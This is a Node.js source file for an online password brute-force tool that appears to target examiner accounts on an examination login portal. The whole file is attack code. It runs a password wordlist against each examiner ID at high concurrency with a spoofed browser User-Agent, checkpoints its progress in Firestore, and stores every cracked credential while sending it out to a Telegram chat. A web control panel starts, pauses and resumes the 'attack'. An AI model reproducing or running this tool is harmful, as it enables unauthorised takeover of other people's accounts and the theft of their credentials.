require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const axios = require('axios');
const admin = require('firebase-admin');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const readline = require('readline');
const pLimit = require('p-limit');

// ==================== FIREBASE INIT (via base64 env) ====================
let serviceAccount;
if (process.env.FIREBASE_CREDENTIALS_BASE64) {
  try {
    const decoded = Buffer.from(process.env.FIREBASE_CREDENTIALS_BASE64, 'base64').toString('utf8');
    serviceAccount = JSON.parse(decoded);
    console.log('✅ Firebase credentials loaded from BASE64 env var');
  } catch (err) {
    console.error('❌ Failed to parse FIREBASE_CREDENTIALS_BASE64:', err.message);
    process.exit(1);
  }
} else if (process.env.FIREBASE_CREDENTIALS) {
  // Fallback to file path (local development only)
  try {
    serviceAccount = require(process.env.FIREBASE_CREDENTIALS);
    console.log('✅ Firebase credentials loaded from file');
  } catch (err) {
    console.error('❌ Firebase credential file not found:', err.message);
    process.exit(1);
  }
} else {
  console.error('❌ No Firebase credentials provided. Set FIREBASE_CREDENTIALS_BASE64 in .env');
  process.exit(1);
}

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount)
});
const db = admin.firestore();

// Test Firebase connection
(async () => {
  try {
    await db.collection('_test').doc('conn').set({ time: Date.now() });
    console.log('✅ Firebase connection successful');
  } catch (err) {
    console.error('❌ Firebase connection failed:', err.message);
    process.exit(1);
  }
})();

// ==================== TELEGRAM ====================
let bot = null;
if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
  console.log('✅ Telegram bot initialized');
} else {
  console.log('⚠️ Telegram disabled – missing token or chat ID');
}

// ==================== CONFIG ====================
const app = express();
const server = http.createServer(app);
const io = socketIo(server);
app.use(express.static('public'));

const LOGIN_URL = process.env.LOGIN_URL;
const LOGIN_TYPE = process.env.LOGIN_TYPE;
const CONCURRENCY = parseInt(process.env.CONCURRENCY) || 50;
const PASSWORD_FILE = process.env.PASSWORD_FILE;
const EXAMINER_FILE = process.env.EXAMINER_FILE;

let isRunning = false;
let isPaused = false;
let currentCheckpoint = null;
let examinerIds = [];
let totalExaminers = 0;
let successes = [];
let speedStats = { requests: 0, startTime: null };

// ==================== LOAD EXAMINERS ====================
function loadExaminers() {
  const data = fs.readFileSync(EXAMINER_FILE, 'utf8');
  examinerIds = JSON.parse(data);
  totalExaminers = examinerIds.length;
  console.log(`Loaded ${totalExaminers} examiners`);
}

// ==================== PASSWORD STREAM ====================
async function* passwordGenerator(startLine = 0) {
  const fileStream = fs.createReadStream(PASSWORD_FILE);
  const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity });
  let lineIndex = 0;
  for await (const line of rl) {
    if (lineIndex >= startLine) {
      yield line.trim();
    }
    lineIndex++;
  }
  rl.close();
}

// ==================== LOGIN ATTEMPT ====================
async function tryLogin(examinerId, password) {
  try {
    const response = await axios.post(LOGIN_URL, {
      loginType: LOGIN_TYPE,
      userid: examinerId,
      password: password
    }, {
      timeout: 5000,
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });
    speedStats.requests++;
    const isSuccess = !response.data.includes('Invalid');
    return { success: isSuccess, password };
  } catch (error) {
    speedStats.requests++;
    return { success: false, password: null };
  }
}

// ==================== HANDLE SUCCESS ====================
async function handleSuccess(examinerId, password) {
  const docRef = db.collection('successful_logins').doc();
  await docRef.set({
    examinerId,
    password,
    timestamp: admin.firestore.FieldValue.serverTimestamp()
  });
  successes.push({ examinerId, password, time: new Date().toISOString() });

  // Telegram notification
  if (bot) {
    const msg = `✅ *Valid Credential Found!*\n👤 Examiner: ${examinerId}\n🔑 Password: ${password}\n🕒 Time: ${new Date().toLocaleString()}`;
    await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, msg, { parse_mode: 'Markdown' }).catch(e => console.error('Telegram error:', e.message));
  }

  io.emit('success', { examinerId, password, time: new Date().toISOString() });
}

// ==================== CHECKPOINT (Firestore) ====================
async function updateCheckpoint(examinerIndex, passwordIndex) {
  const checkpointRef = db.collection('checkpoint').doc('current');
  await checkpointRef.set({
    examinerIndex,
    passwordIndex,
    updatedAt: admin.firestore.FieldValue.serverTimestamp(),
    status: isPaused ? 'paused' : 'running'
  }, { merge: true });
  currentCheckpoint = { examinerIndex, passwordIndex };
}

async function loadCheckpoint() {
  const doc = await db.collection('checkpoint').doc('current').get();
  if (doc.exists) {
    const data = doc.data();
    currentCheckpoint = { examinerIndex: data.examinerIndex, passwordIndex: data.passwordIndex };
    return currentCheckpoint;
  }
  return { examinerIndex: 0, passwordIndex: 0 };
}

// ==================== MAIN ATTACK ENGINE ====================
async function startAttack(resumeFromCheckpoint = true) {
  if (isRunning) return;

  let startExaminerIdx = 0;
  let startPasswordIdx = 0;
  if (resumeFromCheckpoint && currentCheckpoint) {
    startExaminerIdx = currentCheckpoint.examinerIndex;
    startPasswordIdx = currentCheckpoint.passwordIndex;
    console.log(`Resuming from examiner index ${startExaminerIdx}, password index ${startPasswordIdx}`);
  }

  isRunning = true;
  isPaused = false;
  speedStats.requests = 0;
  speedStats.startTime = Date.now();

  io.emit('status', { running: true, paused: false, message: 'Attack started' });

  for (let eIdx = startExaminerIdx; eIdx < totalExaminers && isRunning && !isPaused; eIdx++) {
    const examinerId = examinerIds[eIdx];

    // Skip if already found
    const existing = await db.collection('successful_logins').where('examinerId', '==', examinerId).get();
    if (!existing.empty) {
      console.log(`Skipping ${examinerId} - already found`);
      continue;
    }

    let passwordIndex = (eIdx === startExaminerIdx) ? startPasswordIdx : 0;
    const passGen = passwordGenerator(passwordIndex);
    const limit = pLimit(CONCURRENCY);
    const tasks = [];

    for await (const password of passGen) {
      if (!isRunning || isPaused) break;

      const task = limit(async () => {
        const result = await tryLogin(examinerId, password);
        if (result.success) {
          await handleSuccess(examinerId, result.password);
          return 'found';
        }
        // Update checkpoint periodically
        if (speedStats.requests % 100 === 0) {
          await updateCheckpoint(eIdx, passwordIndex + 1);
          const elapsed = (Date.now() - speedStats.startTime) / 1000;
          const speed = elapsed > 0 ? Math.round(speedStats.requests / elapsed) : 0;
          io.emit('progress', {
            examinerIndex: eIdx,
            totalExaminers,
            passwordIndex: passwordIndex + 1,
            speed,
            currentExaminer: examinerId
          });
        }
        passwordIndex++;
        return null;
      });
      tasks.push(task);
      await new Promise(r => setImmediate(r));
    }

    await Promise.all(tasks);
    if (!isRunning || isPaused) break;
    await updateCheckpoint(eIdx + 1, 0);
    io.emit('progress', {
      examinerIndex: eIdx + 1,
      totalExaminers,
      passwordIndex: 0,
      currentExaminer: examinerIds[eIdx + 1] || 'Done'
    });
  }

  isRunning = false;
  io.emit('status', { running: false, paused: false, message: 'Attack finished' });
  await updateCheckpoint(totalExaminers, 0);
}

// ==================== API & SOCKET.IO ====================
app.get('/api/stats', async (req, res) => {
  const successesSnapshot = await db.collection('successful_logins').get();
  const successList = successesSnapshot.docs.map(doc => doc.data());
  res.json({
    totalExaminers,
    successesCount: successList.length,
    successes: successList,
    isRunning,
    isPaused,
    checkpoint: currentCheckpoint
  });
});

io.on('connection', (socket) => {
  console.log('Web UI connected');
  socket.emit('init', {
    totalExaminers,
    successes,
    isRunning,
    isPaused,
    checkpoint: currentCheckpoint
  });

  socket.on('start', async () => {
    if (isRunning) return;
    await startAttack(true);
  });

  socket.on('pause', async () => {
    if (!isRunning) return;
    isPaused = true;
    isRunning = false;
    await updateCheckpoint(currentCheckpoint.examinerIndex, currentCheckpoint.passwordIndex);
    io.emit('status', { running: false, paused: true, message: 'Paused' });
  });

  socket.on('resume', async () => {
    if (isRunning || !currentCheckpoint) return;
    await startAttack(true);
  });

  socket.on('stop', async () => {
    isRunning = false;
    isPaused = false;
    await updateCheckpoint(0, 0);
    io.emit('status', { running: false, paused: false, message: 'Stopped and reset' });
  });
});

// ==================== START SERVER ====================
loadExaminers();
loadCheckpoint().then(() => {
  server.listen(process.env.PORT || 3000, () => {
    console.log(`🚀 Server running on http://localhost:${process.env.PORT || 3000}`);
  });
});
